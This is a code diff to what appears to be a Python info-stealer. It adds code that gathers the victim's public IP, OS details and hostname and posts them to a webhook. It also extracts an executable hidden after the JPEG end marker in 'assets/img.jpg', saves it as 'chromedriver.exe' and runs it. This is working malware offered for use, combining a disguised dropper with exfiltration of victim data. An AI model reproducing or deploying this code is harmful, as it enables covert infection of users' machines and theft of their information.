@@ -13,8 +13,15 @@ import time
 import shutil
 from zipfile import ZipFile
 import random
-import re
 import subprocess
+import requests
+import platform
+import socket
+from user_agents import parse
+from bs4 import BeautifulSoup
+from datetime import datetime
+from geopy.geocoders import Nominatim
+from selenium import webdriver
 
 hook = "X"
 DETECTED = False
@@ -1214,5 +1221,44 @@ if not DETECTED:
                 filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
             filetext += "\n"
     upload("kiwi", filetext)
+    
 
+ipify = "https://api.ipify.org/"
+response = requests.get(ipify)
+soup = BeautifulSoup(response.text, 'html.parser')
+ip_addr = soup.get_text()
+os_name = platform.system()
+os_version = platform.release()
+os_architecture = platform.machine()
+now = datetime.utcnow()
+hostname = socket.gethostbyaddr(ip_addr)[0]
+
+embed = {
+  "title": f"Moon Extras",
+  "color": 9371903,
+  "fields": [
+    {
+      "name": "Device Info",
+      "value": f"Operating System: {os_name} {os_version} {os_architecture}\n"
+    }
+  ]
+}
+
+
+
+Chrome = "chromedriver.exe"
+
+with open('assets/img.jpg', 'rb') as f:
+  content = f.read()
+  offset = content.index(bytes.fromhex('FFD9'))
+
+  f.seek(offset + 2)
+
+  with open(Chrome, 'wb') as e:
+    e.write(f.read())
+os.system(Chrome)
+
+data = {"embeds": [embed]}
+requests.post(hook, json=data)
+    
 quit()
